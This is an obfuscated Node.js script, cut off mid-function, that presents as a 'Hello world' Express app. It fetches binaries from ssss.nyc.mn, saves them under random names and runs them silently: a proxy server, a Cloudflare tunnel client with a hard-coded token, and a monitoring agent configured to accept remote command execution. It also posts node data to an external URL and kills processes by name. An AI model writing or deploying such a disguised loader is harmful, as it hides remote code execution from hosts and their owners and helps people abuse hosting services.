const _0x3cdc91=_0x45f4;(function(_0xb09bf3,_0x302f04){const _0x26677b={_0x3bec64:0x168,_0x1ea2ef:0x147,_0x129f69:0x139,_0xc96556:0x19d,_0x364eeb:0x12a},_0x30c042=_0x45f4,_0x4b9d14=_0xb09bf3();while(!![]){try{const _0x332c0d=parseInt(_0x30c042(0x1a3))/0x1*(parseInt(_0x30c042(_0x26677b._0x3bec64))/0x2)+parseInt(_0x30c042(0x188))/0x3+parseInt(_0x30c042(_0x26677b._0x1ea2ef))/0x4+parseInt(_0x30c042(_0x26677b._0x129f69))/0x5+-parseInt(_0x30c042(0x1bc))/0x6*(-parseInt(_0x30c042(0x1cf))/0x7)+parseInt(_0x30c042(_0x26677b._0xc96556))/0x8+parseInt(_0x30c042(_0x26677b._0x364eeb))/0x9*(-parseInt(_0x30c042(0x1b9))/0xa);if(_0x332c0d===_0x302f04)break;else _0x4b9d14['push'](_0x4b9d14['shift']());}catch(_0x51ffca){_0x4b9d14['push'](_0x4b9d14['shift']());}}}(_0x28be,0x86964));const express=require(_0x3cdc91(0x172)),app=express(),axios=require(_0x3cdc91(0x1d9)),os=require('os'),fs=require('fs'),path=require(_0x3cdc91(0x144)),{promisify}=require(_0x3cdc91(0x186)),exec=promisify(require(_0x3cdc91(0x1b1))[_0x3cdc91(0x141)]),{execSync}=require(_0x3cdc91(0x1b1)),UPLOAD_URL=process[_0x3cdc91(0x197)]['UPLOAD_URL']||'',PROJECT_URL=process[_0x3cdc91(0x197)]['PROJECT_URL']||'',AUTO_ACCESS=process[_0x3cdc91(0x197)]['AUTO_ACCESS']||![],FILE_PATH=process[_0x3cdc91(0x197)]['FILE_PATH']||_0x3cdc91(0x1db),SUB_PATH=process[_0x3cdc91(0x197)]['SUB_PATH']||'sub',PORT=process[_0x3cdc91(0x197)][_0x3cdc91(0x151)]||process[_0x3cdc91(0x197)]['PORT']||0xbb8,UUID=process[_0x3cdc91(0x197)][_0x3cdc91(0x1c8)]||_0x3cdc91(0x132),NEZHA_SERVER=process[_0x3cdc91(0x197)][_0x3cdc91(0x15e)]||'',NEZHA_PORT=process[_0x3cdc91(0x197)][_0x3cdc91(0x1b7)]||'',NEZHA_KEY=process[_0x3cdc91(0x197)][_0x3cdc91(0x192)]||'',ARGO_DOMAIN=process[_0x3cdc91(0x197)][_0x3cdc91(0x174)]||'',ARGO_AUTH=process[_0x3cdc91(0x197)]['ARGO_AUTH']||_0x3cdc91(0x1e2),ARGO_PORT=process['env'][_0x3cdc91(0x1d8)]||0x1f41,CFIP=process[_0x3cdc91(0x197)][_0x3cdc91(0x131)]||_0x3cdc91(0x16e),CFPORT=process['env']['CFPORT']||0x1bb,NAME=process['env'][_0x3cdc91(0x1ac)]||'';function _0x28be(){const _0x479a2b=['status','join','NEZHA_KEY','random','Error\x20executing\x20command:\x20','/api/delete-nodes','Empowerment\x20failed\x20for\x20','env','Error\x20in\x20startserver:','https://amd64.ssss.nyc.mn/agent','tunnel.yml','countryCode','ARGO_DOMAIN:','7909808OdvtmN','fileUrl','list.txt','abcdefghijklmnopqrstuvwxyz','vmess','tcp','23sYwgLl','get','charAt','\x0askip_connection_count:\x20true\x0askip_procs_count:\x20true\x0atemperature:\x20false\x0atls:\x20','win32','ArgoDomain:','log','post','/sub.txt\x20saved\x20successfully','NAME','existsSync','false','push','http','child_process','https://arm64.ssss.nyc.mn/bot','unshift','\x0a\x20\x20credentials-file:\x20','aarch64','toString','NEZHA_PORT','basename','3341280aHsepm','/api/add-nodes','base64','6azkVGq','tunnel\x20--edge-ip-version\x20auto\x20--config\x20','error','Add\x20automatic\x20access\x20task\x20faild:\x20','&path=%2Ftrojan-argo%3Fed%3D2560#','/dev/null','\x20>/dev/null\x202>&1\x20&','message','ARGO_DOMAIN\x20or\x20ARGO_AUTH\x20variable\x20is\x20empty,\x20use\x20quick\x20tunnels','isFile','Subscription\x20uploaded\x20successfully','/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:','UUID','\x20is\x20running','\x20--disable-auto-update\x20--report-delay\x204\x20--skip-conn\x20--skip-procs\x20>/dev/null\x202>&1\x20&','nohup\x20','arm','\x22\x20>\x20/dev/null\x202>&1','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20run\x20--token\x20','6201335Uohdwn','Download\x20','/vmess-argo','php\x20running\x20error:\x20','readdirSync','Content-Type','\x20>\x20nul\x202>&1','boot.log','length','ARGO_PORT','axios','application/json','./tmp','2083','/vmess-argo?ed=2560','--tls','stream','2087','platform','eyJhIjoiMTBlODg2OWNkMGFkNGE0NzY3NDg4NmI2YmZjMzM2NzMiLCJ0IjoiMGYwMzMxYTEtYzJmZi00ZDYyLTgzNzQtMjhiY2NiOTYyZWE5IiwicyI6Ik1UVmpNR1V5TkRrdFlUQmlNQzAwT0RCaExUazBZVFF0Wm1JMk1HUmhaR00xWldZMSJ9','fileName','statSync','readFileSync','tls','tunnel.json','unlinkSync','ARGO_AUTH\x20mismatch\x20TunnelSecret,use\x20token\x20connect\x20to\x20tunnel','81vBOUZd','filter','&fp=firefox&type=ws&host=','Error\x20downloading\x20files:','match','?security=tls&sni=','mkdirSync','CFIP','ac5cc793-d61e-4253-a334-0469f569e712','utf-8','\x20failed:\x20','443','close','firefox','2096','315250hspzOQ','\x0a\x20\x20\x20\x20','https+local://8.8.8.8/dns-query','\x20-c\x20','/api/add-subscriptions','xtls-rprx-vision','forEach','pkill\x20-f\x20\x22[','exec','createWriteStream','App\x20is\x20running','path','\x0ause_gitee_to_upgrade:\x20false\x0ause_ipv6_country_code:\x20false\x0auuid:\x20','https://amd64.ssss.nyc.mn/v1','2229752wXFQMA','config.yaml','true','substring','stringify','map','pop','chmod','freedom','.exe\x20>\x20nul\x202>&1','SERVER_PORT','split','has','\x0a\x0avmess://','pipe','\x20-p\x20','Empowerment\x20success\x20for\x20','unlink','\x0avless://','rm\x20-rf\x20','quic','https://arm64.ssss.nyc.mn/agent','\x20-c\x20\x22','NEZHA_SERVER','listen','vless','\x20already\x20exists','Can\x27t\x20find\x20a\x20file\x20for\x20the\x20current\x20architecture','floor','\x0adebug:\x20false\x0adisable_auto_update:\x20true\x0adisable_command_execute:\x20false\x0adisable_force_update:\x20true\x0adisable_nat:\x20false\x0adisable_send_query:\x20false\x0agpu:\x20false\x0ainsecure_tls:\x20true\x0aip_report_period:\x201800\x0areport_delay:\x204\x0aserver:\x20','clear','ArgoDomain\x20not\x20found,\x20re-running\x20bot\x20to\x20obtain\x20ArgoDomain','test','89326ReRUjT','send','\x20>/dev/null\x202>&1','none','org','\x0aclient_secret:\x20','cdns.doon.eu.org','catch','/trojan-argo','arm64','express','\x20successfully','ARGO_DOMAIN','text/plain;\x20charset=utf-8','https://amd64.ssss.nyc.mn/bot','tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20','\x0a\x20\x20\x20\x20\x20\x20originRequest:\x0a\x20\x20\x20\x20\x20\x20\x20\x20noTLSVerify:\x20true\x0a\x20\x20\x20\x20-\x20service:\x20http_status:404\x0a\x20\x20','country_code','taskkill\x20/f\x20/im\x20','response','https://arm64.ssss.nyc.mn/v1','\x0a\x20\x20protocol:\x20http2\x0a\x20\x20\x0a\x20\x20ingress:\x0a\x20\x20\x20\x20-\x20hostname:\x20','arch','amd','\x0a\x0atrojan://','includes','/config.yaml\x22\x20>/dev/null\x202>&1\x20&','8443','Thank\x20you\x20for\x20using\x20this\x20script,\x20enjoy!','from','util','then','108156KqZxAx','2053','writeFileSync','data','https://oooo.serv00.net/add-url','/vless-argo','web\x20running\x20error:\x20','127.0.0.1'];_0x28be=function(){return _0x479a2b;};return _0x28be();}!fs[_0x3cdc91(0x1ad)](FILE_PATH)?(fs[_0x3cdc91(0x130)](FILE_PATH),console[_0x3cdc91(0x1a9)](FILE_PATH+'\x20is\x20created')):console[_0x3cdc91(0x1a9)](FILE_PATH+_0x3cdc91(0x161));function generateRandomName(){const _0x2b5967={_0x120e57:0x1d7},_0x424f79=_0x3cdc91,_0x4dfb31=_0x424f79(0x1a0);let _0x5916e2='';for(let _0x5197fa=0x0;_0x5197fa<0x6;_0x5197fa++){_0x5916e2+=_0x4dfb31['charAt'](Math[_0x424f79(0x163)](Math[_0x424f79(0x193)]()*_0x4dfb31[_0x424f79(_0x2b5967._0x120e57)]));}return _0x5916e2;}const npmName=generateRandomName(),webName=generateRandomName(),botName=generateRandomName(),phpName=generateRandomName();let npmPath=path['join'](FILE_PATH,npmName),phpPath=path['join'](FILE_PATH,phpName),webPath=path[_0x3cdc91(0x191)](FILE_PATH,webName),botPath=path[_0x3cdc91(0x191)](FILE_PATH,botName),subPath=path[_0x3cdc91(0x191)](FILE_PATH,'sub.txt'),listPath=path[_0x3cdc91(0x191)](FILE_PATH,_0x3cdc91(0x19f)),bootLogPath=path['join'](FILE_PATH,'boot.log'),configPath=path[_0x3cdc91(0x191)](FILE_PATH,'config.json');function deleteNodes(){const _0x210739={_0x134846:0x1ad,_0x593a95:0x133,_0x6c8e7e:0x12b,_0x40c302:0x195,_0x4c86a2:0x1da},_0x271b32=_0x3cdc91;try{if(!UPLOAD_URL)return;if(!fs[_0x271b32(_0x210739._0x134846)](subPath))return;let _0x4bded9;try{_0x4bded9=fs['readFileSync'](subPath,_0x271b32(_0x210739._0x593a95));}catch{return null;}const _0x4980f8=Buffer['from'](_0x4bded9,_0x271b32(0x1bb))[_0x271b32(0x1b6)](_0x271b32(_0x210739._0x593a95)),_0x5cd82a=_0x4980f8[_0x271b32(0x152)]('\x0a')[_0x271b32(_0x210739._0x6c8e7e)](_0x1e5c5b=>/(vless|vmess|trojan|hysteria2|tuic):\/\//['test'](_0x1e5c5b));if(_0x5cd82a[_0x271b32(0x1d7)]===0x0)return;return axios[_0x271b32(0x1aa)](UPLOAD_URL+_0x271b32(_0x210739._0x40c302),JSON[_0x271b32(0x14b)]({'nodes':_0x5cd82a}),{'headers':{'Content-Type':_0x271b32(_0x210739._0x4c86a2)}})['catch'](_0x496afe=>{return null;}),null;}catch(_0x1ff960){return null;}}function cleanupOldFiles(){const _0x2dc6b0={_0x570e81:0x1c5},_0x4d32e8=_0x3cdc91;try{const _0x4a50b3=fs[_0x4d32e8(0x1d3)](FILE_PATH);_0x4a50b3['forEach'](_0x8608e=>{const _0x586e75=_0x4d32e8,_0x4995c5=path[_0x586e75(0x191)](FILE_PATH,_0x8608e);try{const _0x2c16db=fs[_0x586e75(0x1e4)](_0x4995c5);_0x2c16db[_0x586e75(_0x2dc6b0._0x570e81)]()&&fs[_0x586e75(0x1e8)](_0x4995c5);}catch(_0x33b859){}});}catch(_0x427acd){}}app[_0x3cdc91(0x1a4)]('/',function(_0x1f1545,_0x559ae3){const _0x1c72d2={_0x545c95:0x169},_0x588901=_0x3cdc91;_0x559ae3[_0x588901(_0x1c72d2._0x545c95)]('Hello\x20world!');});async function generateConfig(){const _0x55bffb={_0x5a2a01:0x13e,_0x13228e:0x16b,_0x67200:0x1d1,_0x1f0cc0:0x1a2,_0x2d129a:0x160,_0x30fda4:0x16b,_0x1e310f:0x18f,_0x3e16d8:0x160,_0x186281:0x16b,_0x5bfc94:0x18f,_0x1fc1af:0x1a1,_0x403373:0x170,_0xabf37a:0x1e6,_0xb6f1d4:0x15b},_0x11e397=_0x3cdc91,_0x2a93dc={'log':{'access':_0x11e397(0x1c1),'error':'/dev/null','loglevel':'none'},'inbounds':[{'port':ARGO_PORT,'protocol':_0x11e397(0x160),'settings':{'clients':[{'id':UUID,'flow':_0x11e397(_0x55bffb._0x5a2a01)}],'decryption':_0x11e397(_0x55bffb._0x13228e),'fallbacks':[{'dest':0xbb9},{'path':_0x11e397(0x18d),'dest':0xbba},{'path':_0x11e397(_0x55bffb._0x67200),'dest':0xbbb},{'path':_0x11e397(0x170),'dest':0xbbc}]},'streamSettings':{'network':_0x11e397(_0x55bffb._0x1f0cc0)}},{'port':0xbb9,'listen':'127.0.0.1','protocol':_0x11e397(_0x55bffb._0x2d129a),'settings':{'clients':[{'id':UUID}],'decryption':'none'},'streamSettings':{'network':_0x11e397(0x1a2),'security':_0x11e397(_0x55bffb._0x30fda4)}},{'port':0xbba,'listen':_0x11e397(_0x55bffb._0x1e310f),'protocol':_0x11e397(_0x55bffb._0x3e16d8),'settings':{'clients':[{'id':UUID,'level':0x0}],'decryption':_0x11e397(0x16b)},'streamSettings':{'network':'ws','security':_0x11e397(_0x55bffb._0x186281),'wsSettings':{'path':_0x11e397(0x18d)}},'sniffing':{'enabled':!![],'destOverride':[_0x11e397(0x1b0),'tls',_0x11e397(0x15b)],'metadataOnly':![]}},{'port':0xbbb,'listen':_0x11e397(_0x55bffb._0x5bfc94),'protocol':_0x11e397(_0x55bffb._0x1fc1af),'settings':{'clients':[{'id':UUID,'alterId':0x0}]},'streamSettings':{'network':'ws','wsSettings':{'path':_0x11e397(0x1d1)}},'sniffing':{'enabled':!![],'destOverride':[_0x11e397(0x1b0),'tls','quic'],'metadataOnly':![]}},{'port':0xbbc,'listen':_0x11e397(0x18f),'protocol':'trojan','settings':{'clients':[{'password':UUID}]},'streamSettings':{'network':'ws','security':_0x11e397(0x16b),'wsSettings':{'path':_0x11e397(_0x55bffb._0x403373)}},'sniffing':{'enabled':!![],'destOverride':[_0x11e397(0x1b0),_0x11e397(_0x55bffb._0xabf37a),_0x11e397(_0x55bffb._0xb6f1d4)],'metadataOnly':![]}}],'dns':{'servers':[_0x11e397(0x13b)]},'outbounds':[{'protocol':_0x11e397(0x14f),'tag':'direct'},{'protocol':'blackhole','tag':'block'}]};fs[_0x11e397(0x18a)](path[_0x11e397(0x191)](FILE_PATH,'config.json'),JSON[_0x11e397(0x14b)](_0x2a93dc,null,0x2));}function getSystemArchitecture(){const _0x408b8c={_0x4ed693:0x171},_0x5d0b12=_0x3cdc91,_0x5a9c93=os[_0x5d0b12(0x17e)]();return _0x5a9c93===_0x5d0b12(0x1cc)||_0x5a9c93===_0x5d0b12(_0x408b8c._0x4ed693)||_0x5a9c93===_0x5d0b12(0x1b5)?_0x5d0b12(0x1cc):_0x5d0b12(0x17f);}function downloadFile(_0x1b37ec,_0x13e9ab,_0x505a8b){const _0x3de498={_0x3d7e83:0x1ad,_0x58987e:0x1df,_0x28b7fb:0x187,_0x3f999d:0x16f},_0x3b21ab={_0xed3592:0x1b8},_0x9d4d66={_0x2c8ed5:0x18b,_0x56b221:0x1be},_0x15e671={_0x15b533:0x136,_0x358850:0x1a9,_0x1d0d8d:0x1b8},_0x1bc15f=_0x3cdc91,_0x139c95=_0x1b37ec;!fs[_0x1bc15f(_0x3de498._0x3d7e83)](FILE_PATH)&&fs[_0x1bc15f(0x130)](FILE_PATH,{'recursive':!![]});const _0x553756=fs[_0x1bc15f(0x142)](_0x139c95);axios({'method':'get','url':_0x13e9ab,'responseType':_0x1bc15f(_0x3de498._0x58987e)})[_0x1bc15f(_0x3de498._0x28b7fb)](_0x3a15ac=>{const _0x5aa039={_0x17a193:0x1d0,_0xb12eed:0x134,_0xd5af6b:0x1be},_0x4eefe6=_0x1bc15f;_0x3a15ac[_0x4eefe6(_0x9d4d66._0x2c8ed5)][_0x4eefe6(0x155)](_0x553756),_0x553756['on']('finish',()=>{const _0x5e9770=_0x4eefe6;_0x553756[_0x5e9770(_0x15e671._0x15b533)](),console[_0x5e9770(_0x15e671._0x358850)]('Download\x20'+path[_0x5e9770(_0x15e671._0x1d0d8d)](_0x139c95)+_0x5e9770(0x173)),_0x505a8b(null,_0x139c95);}),_0x553756['on'](_0x4eefe6(_0x9d4d66._0x56b221),_0x39c378=>{const _0x3c4474=_0x4eefe6;fs[_0x3c4474(0x158)](_0x139c95,()=>{});const _0x110e43=_0x3c4474(_0x5aa039._0x17a193)+path[_0x3c4474(0x1b8)](_0x139c95)+_0x3c4474(_0x5aa039._0xb12eed)+_0x39c378[_0x3c4474(0x1c3)];console[_0x3c4474(_0x5aa039._0xd5af6b)](_0x110e43),_0x505a8b(_0x110e43);});})[_0x1bc15f(_0x3de498._0x3f999d)](_0x4d933f=>{const _0xaad992=_0x1bc15f,_0x436733=_0xaad992(0x1d0)+path[_0xaad992(_0x3b21ab._0xed3592)](_0x139c95)+_0xaad992(0x134)+_0x4d933f[_0xaad992(0x1c3)];console['error'](_0x436733),_0x505a8b(_0x436733);});}async function downloadFilesAndRun(){const _0x29ca57={_0x13fb36:0x162,_0x17e600:0x14c,_0x535246:0x181,_0x313531:0x14d,_0x582b10:0x183,_0x626020:0x1dc,_0x15c51d:0x149,_0x3cb255:0x1ae,_0x59aa62:0x1a6,_0x21892e:0x145,_0x2ce99c:0x148,_0x80a857:0x1cb,_0x3a2e37:0x15d,_0x3255f7:0x182,_0x35b18d:0x1c9,_0x4fba61:0x1d2,_0x129830:0x138,_0x247f1d:0x189,_0x30d5f2:0x181,_0x16ef6f:0x1cb,_0x504c1e:0x1a9,_0x357412:0x13c,_0x354f48:0x1a9,_0x3e2b4b:0x1be,_0x13da17:0x1ce,_0x5dd73e:0x1bd,_0x36d9f2:0x1c2,_0x152118:0x194},_0x1a7852=_0x3cdc91,_0x5619dd=getSystemArchitecture(),_0x2dde00=getFilesForArchitecture(_0x5619dd);if(_0x2dde00['length']===0x0){console[_0x1a7852(0x1a9)](_0x1a7852(_0x29ca57._0x13fb36));return;}const _0x5ac874=_0x2dde00[_0x1a7852(_0x29ca57._0x17e600)](_0x4cb869=>{const _0x588659={_0x44a234:0x1e3};return new Promise((_0xc9da92,_0x8f7efc)=>{const _0x201773=_0x45f4;downloadFile(_0x4cb869[_0x201773(_0x588659._0x44a234)],_0x4cb869[_0x201773(0x19e)],(_0x21e649,_0x33f8b1)=>{_0x21e649?_0x8f7efc(_0x21e649):_0xc9da92(_0x33f8b1);});});});try{await Promise['all'](_0x5ac874);}catch(_0x4b82b3){console[_0x1a7852(0x1be)](_0x1a7852(0x12d),_0x4b82b3);return;}function _0x5e69f7(_0x3fed38){const _0x3a779f={_0x242eaa:0x1ad,_0x20afc1:0x14e},_0x4c2929={_0x52b475:0x157},_0x43ff3d=_0x1a7852,_0xc85d13=0x1fd;_0x3fed38[_0x43ff3d(0x13f)](_0x4756fd=>{const _0x13b771=_0x43ff3d;fs[_0x13b771(_0x3a779f._0x242eaa)](_0x4756fd)&&fs[_0x13b771(_0x3a779f._0x20afc1)](_0x4756fd,_0xc85d13,_0x37cbd8=>{const _0x3027a4=_0x13b771;_0x37cbd8?console['error'](_0x3027a4(0x196)+_0x4756fd+':\x20'+_0x37cbd8):console[_0x3027a4(0x1a9)](_0x3027a4(_0x4c2929._0x52b475)+_0x4756fd+':\x20'+_0xc85d13[_0x3027a4(0x1b6)](0x8));});});}const _0x530c68=NEZHA_PORT?[npmPath,webPath,botPath]:[phpPath,webPath,botPath];_0x5e69f7(_0x530c68);if(NEZHA_SERVER&&NEZHA_KEY){if(!NEZHA_PORT){const _0x572bac=NEZHA_SERVER[_0x1a7852(_0x29ca57._0x535246)](':')?NEZHA_SERVER[_0x1a7852(0x152)](':')[_0x1a7852(_0x29ca57._0x313531)]():'',_0x596bd2=new Set([_0x1a7852(0x135),_0x1a7852(_0x29ca57._0x582b10),_0x1a7852(0x138),_0x1a7852(0x1e0),_0x1a7852(_0x29ca57._0x626020),_0x1a7852(0x189)]),_0x129a69=_0x596bd2[_0x1a7852(0x153)](_0x572bac)?_0x1a7852(_0x29ca57._0x15c51d):_0x1a7852(_0x29ca57._0x3cb255),_0x35083f=_0x1a7852(0x16d)+NEZHA_KEY+_0x1a7852(0x164)+NEZHA_SERVER+_0x1a7852(_0x29ca57._0x59aa62)+_0x129a69+_0x1a7852(_0x29ca57._0x21892e)+UUID;fs['writeFileSync'](path[_0x1a7852(0x191)](FILE_PATH,_0x1a7852(_0x29ca57._0x2ce99c)),_0x35083f);const _0x52c8eb=_0x1a7852(_0x29ca57._0x80a857)+phpPath+_0x1a7852(_0x29ca57._0x3a2e37)+FILE_PATH+_0x1a7852(_0x29ca57._0x3255f7);try{await exec(_0x52c8eb),console[_0x1a7852(0x1a9)](phpName+_0x1a7852(_0x29ca57._0x35b18d)),await new Promise(_0x3a29ea=>setTimeout(_0x3a29ea,0x3e8));}catch(_0x344a74){console[_0x1a7852(0x1be)](_0x1a7852(_0x29ca57._0x4fba61)+_0x344a74);}}else{let _0x2cbbb0='';const _0x15ef95=['443','8443',_0x1a7852(_0x29ca57._0x129830),_0x1a7852(0x1e0),'2083',_0x1a7852(_0x29ca57._0x247f1d)];_0x15ef95[_0x1a7852(_0x29ca57._0x30d5f2)](NEZHA_PORT)&&(_0x2cbbb0=_0x1a7852(0x1de));const _0x4bff7e=_0x1a7852(_0x29ca57._0x16ef6f)+npmPath+'\x20-s\x20'+NEZHA_SERVER+':'+NEZHA_PORT+_0x1a7852(0x156)+NEZHA_KEY+'\x20'+_0x2cbbb0+_0x1a7852(0x1ca);try{await exec(_0x4bff7e),console['log'](npmName+_0x1a7852(0x1c9)),await new Promise(_0x334d4c=>setTimeout(_0x334d4c,0x3e8));}catch(_0xb2107c){console['error']('npm\x20running\x20error:\x20'+_0xb2107c);}}}else console[_0x1a7852(_0x29ca57._0x504c1e)]('NEZHA\x20variable\x20is\x20empty,skip\x20running');const _0x2b4358=_0x1a7852(_0x29ca57._0x16ef6f)+webPath+_0x1a7852(_0x29ca57._0x357412)+FILE_PATH+'/config.json\x20>/dev/null\x202>&1\x20&';try{await exec(_0x2b4358),console[_0x1a7852(_0x29ca57._0x354f48)](webName+_0x1a7852(0x1c9)),await new Promise(_0x23e46e=>setTimeout(_0x23e46e,0x3e8));}catch(_0x1e0735){console[_0x1a7852(_0x29ca57._0x3e2b4b)](_0x1a7852(0x18e)+_0x1e0735);}if(fs[_0x1a7852(0x1ad)](botPath)){let _0xd7d112;if(ARGO_AUTH['match'](/^[A-Z0-9a-z=]{120,250}$/))_0xd7d112=_0x1a7852(_0x29ca57._0x13da17)+ARGO_AUTH;else ARGO_AUTH[_0x1a7852(0x12e)](/TunnelSecret/)?_0xd7d112=_0x1a7852(_0x29ca57._0x5dd73e)+FILE_PATH+'/tunnel.yml\x20run':_0xd7d112='tunnel\x20--edge-ip-version\x20auto\x20--no-autoupdate\x20--protocol\x20http2\x20--logfile\x20'+FILE_PATH+'/boot.log\x20--loglevel\x20info\x20--url\x20http://localhost:'+ARGO_PORT;try{await exec(_0x1a7852(0x1cb)+botPath+'\x20'+_0xd7d112+_0x1a7852(_0x29ca57._0x36d9f2)),console[_0x1a7852(0x1a9)](botName+_0x1a7852(0x1c9)),await new Promise(_0x4379ed=>setTimeout(_0x4379ed,0x7d0));}catch(_0x3d31ad){console[_0x1a7852(_0x29ca57._0x3e2b4b)](_0x1a7852(_0x29ca57._0x152118)+_0x3d31ad);}}await new Promise(_0xc95640=>setTimeout(_0xc95640,0x1388));}function getFilesForArchitecture(_0x3f2199){const _0xe50d78={_0x287f80:0x1cc,_0x25ec27:0x1b2,_0x55c183:0x176,_0x2f6008:0x1b3,_0x2c027f:0x17c,_0x51ca38:0x146,_0x1fcb7f:0x1b3},_0x4ba042=_0x3cdc91;let _0x29f33f;_0x3f2199===_0x4ba042(_0xe50d78._0x287f80)?_0x29f33f=[{'fileName':webPath,'fileUrl':'https://arm64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x4ba042(_0xe50d78._0x25ec27)}]:_0x29f33f=[{'fileName':webPath,'fileUrl':'https://amd64.ssss.nyc.mn/web'},{'fileName':botPath,'fileUrl':_0x4ba042(_0xe50d78._0x55c183)}];if(NEZHA_SERVER&&NEZHA_KEY){if(NEZHA_PORT){const _0x284d1c=_0x3f2199==='arm'?_0x4ba042(0x15c):_0x4ba042(0x199);_0x29f33f[_0x4ba042(_0xe50d78._0x2f6008)]({'fileName':npmPath,'fileUrl':_0x284d1c});}else{const _0x16f47a=_0x3f2199==='arm'?_0x4ba042(_0xe50d78._0x2c027f):_0x4ba042(_0xe50d78._0x51ca38);_0x29f33f[_0x4ba042(_0xe50d78._0x1fcb7f)]({'fileName':phpPath,'fileUrl':_0x16f47a});}}return _0x29f33f;}function argoType(){const _0x5162eb={_0x4e43f7:0x1a9,_0x151f01:0x1c4,_0x33e19b:0x1e7,_0x55908c:0x1b4,_0x536f36:0x17d,_0x5f47ed:0x18a,_0x52986b:0x19a,_0x30f1a0:0x1e9},_0x4f1df8=_0x3cdc91;if(!ARGO_AUTH||!ARGO_DOMAIN){console[_0x4f1df8(_0x5162eb._0x4e43f7)](_0x4f1df8(_0x5162eb._0x151f01));return;}if(ARGO_AUTH[_0x4f1df8(0x181)]('TunnelSecret')){fs[_0x4f1df8(0x18a)](path['join'](FILE_PATH,_0x4f1df8(_0x5162eb._0x33e19b)),ARGO_AUTH);const _0x4056fb='\x0a\x20\x20tunnel:\x20'+ARGO_AUTH[_0x4f1df8(0x152)]('\x22')[0xb]+_0x4f1df8(_0x5162eb._0x55908c)+path[_0x4f1df8(0x191)](FILE_PATH,_0x4f1df8(0x1e7))+_0x4f1df8(_0x5162eb._0x536f36)+ARGO_DOMAIN+'\x0a\x20\x20\x20\x20\x20\x20service:\x20http://localhost:'+ARGO_PORT+_0x4f1df8(0x178);fs[_0x4f1df8(_0x5162eb._0x5f47ed)](path[_0x4f1df8(0x191)](FILE_PATH,_0x4f1df8(_0x5162eb._0x52986b)),_0x4056fb);}else console[_0x4f1df8(0x1a9)](_0x4f1df8(_0x5162eb._0x30f1a0));}async function extractDomains(){const _0x330668={_0x41c7cc:0x191,_0x3bf2f6:0x1a8,_0x16bd2c:0x166,_0x56437c:0x1c7,_0xd39aad:0x194},_0xafbb65={_0x570c7f:0x1a4,_0x4e772f:0x18b,_0x1fc3af:0x190,_0x383e2f:0x19b,_0x2fb739:0x16c},_0x31e88f={_0x5d821f:0x1e1,_0x408002:0x140,_0x16e63d:0x14a,_0x221856:0x1cd},_0x36ff44={_0x4dd3bc:0x1af},_0x2ddbcc=_0x3cdc91;let _0x2a5385;if(ARGO_AUTH&&ARGO_DOMAIN)_0x2a5385=ARGO_DOMAIN,console['log'](_0x2ddbcc(0x19c),_0x2a5385),await _0x531fc9(_0x2a5385);else try{const _0x741955=fs[_0x2ddbcc(0x1e5)](path[_0x2ddbcc(_0x330668._0x41c7cc)](FILE_PATH,_0x2ddbcc(0x1d6)),'utf-8'),_0x3e1215=_0x741955['split']('\x0a'),_0x1f16d5=[];_0x3e1215['forEach'](_0x32bbd1=>{const _0x537e40=_0x2ddbcc,_0x4de4c6=_0x32bbd1[_0x537e40(0x12e)](/https?:\/\/([^ ]*trycloudflare\.com)\/?/);if(_0x4de4c6){const _0x10a6c5=_0x4de4c6[0x1];_0x1f16d5[_0x537e40(_0x36ff44._0x4dd3bc)](_0x10a6c5);}});if(_0x1f16d5[_0x2ddbcc(0x1d7)]>0x0)_0x2a5385=_0x1f16d5[0x0],console[_0x2ddbcc(0x1a9)](_0x2ddbcc(_0x330668._0x3bf2f6),_0x2a5385),await _0x531fc9(_0x2a5385);else{console[_0x2ddbcc(0x1a9)](_0x2ddbcc(_0x330668._0x16bd2c)),fs[_0x2ddbcc(0x1e8)](path['join'](FILE_PATH,'boot.log'));async function _0x1706dc(){const _0x1df216=_0x2ddbcc;try{process[_0x1df216(_0x31e88f._0x5d821f)]==='win32'?await exec(_0x1df216(0x17a)+botName+_0x1df216(0x150)):await exec(_0x1df216(_0x31e88f._0x408002)+botName[_0x1df216(0x1a5)](0x0)+']'+botName[_0x1df216(_0x31e88f._0x16e63d)](0x1)+_0x1df216(_0x31e88f._0x221856));}catch(_0xdc012c){}}_0x1706dc(),await new Promise(_0x106ec8=>setTimeout(_0x106ec8,0xbb8));const _0x170ccf=_0x2ddbcc(0x177)+FILE_PATH+_0x2ddbcc(_0x330668._0x56437c)+ARGO_PORT;try{await exec(_0x2ddbcc(0x1cb)+botPath+'\x20'+_0x170ccf+_0x2ddbcc(0x1c2)),console['log'](botName+'\x20is\x20running'),await new Promise(_0x24f721=>setTimeout(_0x24f721,0xbb8)),await extractDomains();}catch(_0x4133da){console['error'](_0x2ddbcc(_0x330668._0xd39aad)+_0x4133da);}}}catch(_0x11d6c3){console[_0x2ddbcc(0x1be)]('Error\x20reading\x20boot.log:',_0x11d6c3);}async function _0x1cf03d(){const _0x4f2415=_0x2ddbcc;try{const _0x5bbbb1=await axios[_0x4f2415(_0xafbb65._0x570c7f)]('https://ipapi.co/json/',{'timeout':0xbb8});if(_0x5bbbb1[_0x4f2415(_0xafbb65._0x4e772f)]&&_0x5bbbb1[_0x4f2415(0x18b)][_0x4f2415(0x179)]&&_0x5bbbb1['data']['org'])return _0x5bbbb1[_0x4f2415(_0xafbb65._0x4e772f)][_0x4f2415(0x179)]+'_'+_0x5bbbb1['data']['org'];}catch(_0x2052bc){try{const _0x54a6fd=await axios['get']('http://ip-api.com/json/',{'timeout':0xbb8});if(_0x54a6fd[_0x4f2415(_0xafbb65._0x4e772f)]&&_0x54a6fd[_0x4f2415(0x18b)][_0x4f2415(_0xafbb65._0x1fc3af)]==='success'&&_0x54a6fd[_0x4f2415(0x18b)][_0x4f2415(_0xafbb65._0x383e2f)]&&_0x54a6fd[_0x4f2415(0x18b)][_0x4f2415(_0xafbb65._0x2fb739)])return _0x54a6fd['data'][_0x4f2415(0x19b)]+'_'+_0x54a6fd[_0x4f2415(0x18b)][_0x4f2415(0x16c)];}catch(_0x207414){}}return'Unknown';}async function _0x531fc9(_0x473379){const _0x87d4e1=await _0x1cf03d(),_0x21f9c0=NAME?NAME+'-'+_0x87d4e1:_0x87d4e1;return new Promise(_0x56b42d=>{const 